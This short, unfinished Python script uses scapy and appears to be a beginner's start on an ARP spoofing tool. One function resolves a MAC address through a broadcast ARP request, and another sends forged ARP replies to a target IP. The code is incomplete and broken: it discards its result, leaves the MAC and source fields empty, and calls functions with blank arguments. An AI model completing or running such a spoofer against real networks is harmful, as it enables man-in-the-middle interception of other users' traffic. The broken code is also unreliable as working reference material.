#!/usr/bin/env python 

import scapy.all as scapy

def get_mac(ip):
	arp_req = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_req_broadcast = broadcast/arp_req
	answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

	answered_list[0][1].hwsrc
	clients_list = []


def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst="")
	scapy.send(packet)

get_mac("")	


#psrc = ip address
#hwsrc = mac address